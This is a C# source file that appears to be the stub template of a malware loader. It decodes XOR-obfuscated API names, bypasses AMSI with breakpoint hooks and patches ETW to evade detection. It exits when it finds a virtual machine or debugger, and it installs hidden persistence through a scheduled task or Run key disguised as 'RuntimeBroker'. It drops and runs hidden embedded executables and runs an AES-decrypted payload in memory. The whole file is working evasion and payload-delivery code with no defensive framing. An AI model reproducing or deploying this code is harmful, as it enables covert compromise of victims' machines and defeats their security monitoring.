using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Management;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;

namespace namespace_name
{
    internal class class_name
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

#if ANTI_DEBUG
        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();
#endif

#if NATIVE
        private delegate void NativeEntryPointDelegate();
#endif

        private static uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint EXCEPTION_BREAKPOINT = 0x80000003;

        private static bool _amsiPatched;
        private static IntPtr[] _bpAddrs;
        private static byte[] _bpOrig;
        private static int[] _bpCleanup;
        private static int[] _bpRetVal;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint VehDel(ref EXCEPTION_POINTERS ep);
        private static VehDel _vehDel;

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_POINTERS
        {
            public IntPtr ExceptionRecord;
            public IntPtr ContextRecord;
        }

        private static string D(string s, byte k)
        {
            char[] c = s.ToCharArray();
            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ k);
            return new string(c);
        }

        private static uint Handler(ref EXCEPTION_POINTERS ep)
        {
            if (!_amsiPatched) return 0;

            uint code = (uint)Marshal.ReadInt32(ep.ExceptionRecord);
            if (code != EXCEPTION_BREAKPOINT) return 0;

            IntPtr ctx = ep.ContextRecord;
            bool x64 = IntPtr.Size == 8;
            long ip = x64 ? Marshal.ReadInt64(ctx, 0xF8) : Marshal.ReadInt32(ctx, 0xB8);

            for (int i = 0; i < _bpAddrs.Length; i++)
            {
                if (_bpAddrs[i].ToInt64() != ip) continue;

                uint old2;
                VirtualProtect(_bpAddrs[i], (UIntPtr)1, PAGE_EXECUTE_READWRITE, out old2);
                Marshal.WriteByte(_bpAddrs[i], _bpOrig[i]);
                VirtualProtect(_bpAddrs[i], (UIntPtr)1, old2, out old2);

                long sp = x64 ? Marshal.ReadInt64(ctx, 0x98) : Marshal.ReadInt32(ctx, 0xC4);
                long retAddr = x64 ? Marshal.ReadInt64((IntPtr)sp) : Marshal.ReadInt32((IntPtr)sp);

                if (x64)
                {
                    Marshal.WriteInt64(ctx, 0x78, _bpRetVal[i]);
                    Marshal.WriteInt64(ctx, 0xF8, retAddr);
                    Marshal.WriteInt64(ctx, 0x98, sp + _bpCleanup[i]);
                }
                else
                {
                    Marshal.WriteInt32(ctx, 0xB0, _bpRetVal[i]);
                    Marshal.WriteInt32(ctx, 0xB8, (int)retAddr);
                    Marshal.WriteInt32(ctx, 0xC4, (int)(sp + _bpCleanup[i]));
                }

                return unchecked((uint)-1);
            }

            return 0;
        }

        private static void SetBp(IntPtr addr, int cleanup, int retVal)
        {
            uint old;
            if (!VirtualProtect(addr, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out old)) return;
            int idx = _bpAddrs.Length;
            Array.Resize(ref _bpAddrs, idx + 1);
            Array.Resize(ref _bpOrig, idx + 1);
            Array.Resize(ref _bpCleanup, idx + 1);
            Array.Resize(ref _bpRetVal, idx + 1);
            _bpAddrs[idx] = addr;
            _bpOrig[idx] = Marshal.ReadByte(addr);
            Marshal.WriteByte(addr, 0xCC);
            _bpCleanup[idx] = cleanup;
            _bpRetVal[idx] = retVal;
            VirtualProtect(addr, (UIntPtr)1, old, out old);
        }

        private static void InstallBypass()
        {
            IntPtr amsi = LoadLibrary(D("\x0B\x07\x19\x03\x44\x0E\x06\x06", 0x6A));
            if (amsi == IntPtr.Zero) return;

            _bpAddrs = new IntPtr[0];
            _bpOrig = new byte[0];
            _bpCleanup = new int[0];
            _bpRetVal = new int[0];

            if (IntPtr.Size == 8)
            {
                IntPtr sb = GetProcAddress(amsi, D("\x2B\x07\x19\x03\x39\x09\x0B\x04\x28\x1F\x0C\x0C\x0F\x18", 0x6A));
                if (sb != IntPtr.Zero) SetBp(sb, 8, 0);
            }
            else
            {
                IntPtr si = GetProcAddress(amsi, D("\x2B\x07\x19\x03\x23\x04\x03\x1E\x03\x0B\x06\x03\x10\x0F", 0x6A));
                if (si != IntPtr.Zero) SetBp(si, 12, unchecked((int)0x80004005));

                IntPtr sb = GetProcAddress(amsi, D("\x2B\x07\x19\x03\x39\x09\x0B\x04\x28\x1F\x0C\x0C\x0F\x18", 0x6A));
                if (sb != IntPtr.Zero) SetBp(sb, 28, 0);

                IntPtr ss = GetProcAddress(amsi, D("\x2B\x07\x19\x03\x39\x09\x0B\x04\x39\x1E\x18\x03\x04\x0D", 0x6A));
                if (ss != IntPtr.Zero) SetBp(ss, 24, 0);
            }

            if (_bpAddrs.Length == 0) return;

            _vehDel = new VehDel(Handler);
            AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_vehDel));
            GC.KeepAlive(_vehDel);

            _amsiPatched = true;
        }

        static void Main(string[] args)
        {
            string currentfilename = Process.GetCurrentProcess().MainModule.FileName;

#if STARTUP
            try
            {
                bool isStartup = IsStartup(Console.Title);
                if (!isStartup)
                {
                    InstallStartup(Console.Title);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
                Process.GetCurrentProcess().Kill();
            }
#endif

#if ANTI_VM
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"Select * from Win32_ComputerSystem");
            ManagementObjectCollection instances = searcher.Get();
            foreach (ManagementBaseObject inst in instances)
            {
                string manufacturer = inst[@"Manufacturer"].ToString().ToLower();
                if ((manufacturer == @"microsoft corporation" && inst[@"Model"].ToString().ToUpperInvariant().Contains(@"VIRTUAL")) || manufacturer.Contains(@"vmware") || inst[@"Model"].ToString() == @"VirtualBox")
                {
                    Environment.Exit(1);
                }
            }
            searcher.Dispose();
#endif

#if ANTI_DEBUG
            bool remotedebug = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent())
            {
                Environment.Exit(-1);
            }
#endif

            InstallBypass();

            IntPtr ntdll = LoadLibrary(@"ntdll.dll");
            IntPtr etwaddr = GetProcAddress(ntdll, @"EtwEventWrite");
            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xC3 } : new byte[] { 0xC2, 0x14, 0x00 };
            uint oldProtect;
            VirtualProtect(etwaddr, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
            Marshal.Copy(Patch, 0, etwaddr, Patch.Length);
            VirtualProtect(etwaddr, (UIntPtr)Patch.Length, oldProtect, out oldProtect);

            string payloadstr = @"payload.exe";
            
            Assembly asm = Assembly.GetExecutingAssembly();
            foreach (string name in asm.GetManifestResourceNames())
            {
                if (name == payloadstr || name == @"UAC")
                {
                    continue;
                }
                if (name.EndsWith(@".exe") || name.EndsWith(@".bat"))
                {
                    try
                    {
                        File.WriteAllBytes(name, getembeddedresourcefunction_name(name));
                        File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
                        new Thread(() =>
                        {
                            Process.Start(name).WaitForExit();
                            File.SetAttributes(name, FileAttributes.Normal);
                            File.Delete(name);
                        }).Start();
                    }
                    catch
                    {
                    }
                }
            }

            byte[] payload = uncompressfunction_name(aesfunction_name(getembeddedresourcefunction_name(payloadstr), Convert.FromBase64String(@"key_str"), Convert.FromBase64String(@"iv_str")));
            string[] targs = new string[] { };
            try
            {
                targs = args[0].Split(' ');
            }
            catch
            {
            }

#if NATIVE
            unsafe
            {
                fixed (byte* _pointer = payload)
                {
                    IntPtr _mem = (IntPtr)_pointer;
                    uint oldProtect;
                    VirtualProtect(_mem, (UIntPtr)payload.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
                    NativeEntryPointDelegate NativeExecute = (NativeEntryPointDelegate)Marshal.GetDelegateForFunctionPointer(_mem, typeof(NativeEntryPointDelegate));
                    NativeExecute();
                    Environment.Exit(-1);
                }
            }
#else
            MethodInfo entry = Assembly.Load(payload).EntryPoint;
            try { entry.Invoke(null, new object[] { targs }); }
            catch { entry.Invoke(null, null); }
#endif
        }

        private static bool IsAdmin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

#if STARTUP
        private static bool IsStartup(string path)
        {
            if (path.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) == true)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        private static void InstallStartup(string batPath)
        {
            string currentfileextension = ".bat";
            string randomvar = new Random().Next(1, 1000).ToString();
            string newpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\startup_str_" + randomvar + currentfileextension;
            if (IsAdmin())
            {
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = "Register-ScheduledTask -TaskName 'RuntimeBroker_startup_" + randomvar + "_str' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '" + newpath + "') -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -ExecutionTimeLimit 0) -RunLevel Highest -Force",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                }).WaitForExit();
            }
            else
            {
                var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("RuntimeBroker_startup_" + randomvar + @"_str", "cmd.exe /c \"" + newpath + "\"");
                key.Dispose();
            }
            if (batPath.IndexOf(newpath, StringComparison.OrdinalIgnoreCase) == 0) return;
            File.Copy(batPath, newpath, true);
            Process.Start(newpath);
            Environment.Exit(-1);
        }
#endif

        private static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
        {
            AesManaged aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);
            decryptor.Dispose();
            aes.Dispose();
            return decrypted;
        }

        private static byte[] uncompressfunction_name(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
            gs.CopyTo(mso);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }

        private static byte[] getembeddedresourcefunction_name(string name)
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            MemoryStream ms = new MemoryStream();
            Stream stream = asm.GetManifestResourceStream(name);
            stream.CopyTo(ms);
            stream.Dispose();
            byte[] ret = ms.ToArray();
            ms.Dispose();
            return ret;
        }
    }
}
